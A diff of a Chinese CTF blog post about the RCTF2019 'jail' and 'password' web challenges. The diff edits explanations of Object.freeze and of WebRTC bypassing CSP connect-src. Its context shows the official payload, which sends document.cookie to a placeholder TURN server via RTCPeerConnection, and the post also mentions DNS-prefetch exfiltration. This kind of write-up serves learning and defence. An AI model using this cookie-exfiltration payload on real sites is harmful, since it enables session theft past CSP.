@@ -17,7 +17,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/Aluvion/aluvion.github.io/master/css/images/rctf2019/2019052002.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Aluvion/aluvion.github.io/master/css/images/rctf2019/2019052301.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Aluvion/aluvion.github.io/master/css/images/rctf2019/2019052302.png">
-<meta property="og:updated_time" content="2019-05-23T06:53:52.821Z">
+<meta property="og:updated_time" content="2019-05-23T12:53:25.179Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="RCTF2019-Web-jail&#x2F;password引发的思考和学习">
 <meta name="twitter:description" content="前言上周在看 wonderkun 师傅 GitHub 中收集的各种题目，周末打了 RCTF，不得不说真是一个优秀的比赛，每道题都能学习到新的知识。 在做 jail 题目和阅读官方 wp 的时候，发现了很多值得注意和学习的点，所以写一篇文章总结下来。 官方 wp 和题目源码：https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf20">
@@ -131,7 +131,7 @@
 <li><p>为对象的所有数据属性将 writable 特性设置为 false。当 writable 为 false 时，无法更改数据属性值。</p>
 </li>
 </ul>
-<p>可以得知无法修改属性的原因是 writable 特性被设置为了 false，然后我们通过 getOwnPropertyDescriptors 查看 location 对象下的属性的特性：</p>
+<p>可以得知无法修改属性的原因是 writable 特性被设置为了 false，而因为 configurable 也被设置为了 false，所以我们无法将其解冻。然后我们通过 getOwnPropertyDescriptors 查看 location 对象下的属性的特性：</p>
 <p><img src="https://raw.githubusercontent.com/Aluvion/aluvion.github.io/master/css/images/rctf2019/2019052001.png" alt=""></p>
 <p>可以看到，在冻结了 document.location 之后，location.href 属性的 writable 已经变成了 false，就这是为什么我们无法通过修改它来进行跳转了。</p>
 <p>我们再注意解题使用的 host，可以发现这个属性没有 writable 特性，它的取值和赋值使用的是 getter 和 setter，这就是为什么它不会被 Object.freeze 冻结了。</p>
@@ -144,7 +144,7 @@
 <p>简单来说就是利用 js 动态创建 link 标签，然后利用 DNS 预解析查询外带数据，不多说了。</p>
 <h4 id="WebRTC"><a href="#WebRTC" class="headerlink" title="WebRTC"></a>WebRTC</h4><p>CSP 中用来限制连接的配置是 connect-src，受限制的 API 是：</p>
 <p><img src="https://raw.githubusercontent.com/Aluvion/aluvion.github.io/master/css/images/rctf2019/2019052002.png" alt=""></p>
-<p>而 WebRTC 不使用 fetch 所以不受影响，GitHub 上也有人提过 WebRTC 会绕过 CSP 的 connect-src 策略：<a href="https://github.com/w3c/webrtc-pc/issues/1727" target="_blank" rel="noopener">https://github.com/w3c/webrtc-pc/issues/1727</a> 。</p>
+<p>而 WebRTC 不在其中，也不使用 fetch 所以不受影响，GitHub 上也有人提过 WebRTC 会绕过 CSP 的 connect-src 策略：<a href="https://github.com/w3c/webrtc-pc/issues/1727" target="_blank" rel="noopener">https://github.com/w3c/webrtc-pc/issues/1727</a> 。</p>
 <p>官方 payload 如下：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pc = <span class="keyword">new</span> RTCPeerConnection(&#123;<span class="string">"iceServers"</span>:[&#123;<span class="string">"urls"</span>:[<span class="string">"turn:YOUR_IP:YOUR_PORT?transport=udp"</span>],<span class="string">"username"</span>:<span class="built_in">document</span>.cookie,<span class="string">"credential"</span>:<span class="string">"."</span>&#125;]&#125;);</span><br><span class="line">pc.createOffer().then(<span class="function">(<span class="params">sdp</span>)=&gt;</span>pc.setLocalDescription(sdp));</span><br></pre></td></tr></table></figure>
 <p>我试了一下，好像不能使用 nc tcpdump 之类的获取数据，可能需要搭建一个 turn 服务器。</p>
@@ -180,7 +180,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/05/23/RCTF2019-Web-jail-password引发的思考和学习/" data-id="cjw0awgtd000xxsv6gpz4ogno" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2019/05/23/RCTF2019-Web-jail-password引发的思考和学习/" data-id="cjw0nqr1v0016twv6l6igbdii" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
